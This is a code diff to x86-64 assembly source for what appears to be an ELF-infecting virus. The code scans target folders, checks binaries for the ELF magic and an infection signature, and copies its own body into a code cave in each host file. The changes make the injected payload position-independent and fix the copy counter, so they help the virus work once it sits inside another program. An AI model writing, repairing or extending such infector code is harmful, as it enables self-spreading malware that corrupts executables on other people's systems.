@@ -95,9 +95,9 @@ _start:
 	push r10
 	push r11
 
-	mov rdi, infected_folder_1			; treate_folder(infected_folder_1);
+	lea rdi, [rel infected_folder_1]		; treate_folder(infected_folder_1);
 	call treate_folder				; ...
-	mov rdi, infected_folder_2			; treate_folder(infected_folder_2);
+	lea rdi, [rel infected_folder_2]		; treate_folder(infected_folder_2);
 	call treate_folder				; ...
 
 	; test if jmp_value is not defined
@@ -392,7 +392,8 @@ is_elf_64:
 	mov rsi, 0					; counter = 0;
 	.begin_magic_loop:				; while (true) {
 		mov al, [rdi + rsi]			; 	_c = file_map[counter];
-		mov bl, [elf_64_magic + rsi]		; 	_magic_c = elf_64_magic[counter];
+		lea r8, [rel elf_64_magic]
+		mov bl, [r8+rsi]				; 	_magic_c = elf_64_magic[counter];
 		cmp al, bl				; 	if (_c != _magic_c)
 		jne .end_not_equal			; 		goto end_not_equal;
 		inc rsi					; 	counter++;
@@ -497,7 +498,8 @@ has_signature:
 	mov rsi, 0					; counter = 0;
 	.begin_signature_loop:				; while (true) {
 		mov al, [rdi + rsi]			; 	_c = file_map[counter];
-		mov bl, [signature + rsi]		; 	_signature_c = signature[counter];
+		lea r8, [rel signature]
+		mov bl, [r8 + rsi]			; 	_signature_c = signature[counter];
 		cmp al, bl				; 	if (_c != _signature_c)
 		jne .end_not_equal			; 		goto end_not_equal;
 		inc rsi					; 	counter++;
@@ -578,8 +580,8 @@ inject:
 	; copy all bytes between _start and _end to the codecave
 	mov rdi, [file_map]				; dest = file_map + new_entry;
 	add rdi, [new_entry]				; ...
-	mov rsi, _start					; src = _start;
-	mov rdx, _end - _start				; len = _end - _start;
+	lea rsi, [rel _start]				; src = _start;
+	mov rcx, _end - _start				; len = _end - _start;
 	rep movsb					; memcpy(dest, src, len);
 
 	; increment segment size
